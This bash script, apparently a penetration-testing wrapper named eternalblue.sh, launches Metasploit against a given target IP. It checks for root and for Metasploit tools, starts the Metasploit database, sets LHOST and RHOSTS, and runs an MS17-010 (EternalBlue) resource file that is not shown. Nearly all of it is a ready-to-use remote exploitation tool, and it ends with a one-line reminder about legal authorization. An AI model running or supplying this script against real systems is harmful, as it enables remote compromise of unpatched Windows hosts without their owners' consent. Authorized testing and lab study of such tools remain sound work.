#!/bin/bash

# Function to display usage
usage() {
    echo -e "\nSyntax: eternalblue.sh <local IP> <target IP>"
    echo "Example: ./eternalblue.sh 10.10.10.10 10.10.10.20\n"
}

# Check for root privileges
if [ "$(id -u)" -ne 0 ]; then
    echo "Please run as root"
    exit 1
fi

# Check if the required number of arguments was provided
if [ $# -ne 2 ]; then
    usage
    exit 1
fi

LOCAL_IP="$1"
TARGET_IP="$2"

# Check for required tools (msfdb and msfconsole)
if ! command -v msfdb &> /dev/null || ! command -v msfconsole &> /dev/null; then
    echo "Error: Metasploit tools not found."
    exit 1
fi

# Check if MSF script file exists
MSF_SCRIPT="./msfscripts/ms17_010.rc"
if [ ! -f "$MSF_SCRIPT" ]; then
    echo "Error: MSF script file $MSF_SCRIPT not found."
    exit 1
fi

echo "Starting Metasploit Database"
msfdb start

echo "Starting Metasploit Console and executing MS17-010 script"
msfconsole -q -x "setg LHOST $LOCAL_IP; setg RHOSTS $TARGET_IP; resource $MSF_SCRIPT"

# Note: Ensure you have legal authorization to run this script against the target.
